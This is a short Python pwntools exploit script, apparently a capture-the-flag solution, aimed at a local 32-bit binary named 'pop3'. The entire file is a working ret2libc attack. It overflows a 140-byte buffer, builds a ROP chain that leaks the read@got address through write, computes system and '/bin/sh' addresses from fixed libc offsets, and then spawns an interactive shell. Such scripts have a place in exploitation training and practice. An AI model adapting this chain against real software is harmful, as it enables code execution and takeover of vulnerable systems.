from pwn import *
context(arch='i386', os='linux')
#conventions for pwntools ^

first_part = ("A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08"
+ "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00" )
# write@plt addr + vulfunc addr + fd + read@got + size)
r = process("./pop3", shell=True) 
r.sendline(first_part ) 
a=unpack(r.recv(4))
print(f"Leak Addr is {hex(a)}")

system_address=a-0xbdfc0 #read addr - system addr
binsh_address = a+0xab788 #/bin/sh addr -read addr

r.sendline(b'A'*140 + pack(system_address) + b'JUNK' + pack(binsh_address))

r.interactive() 
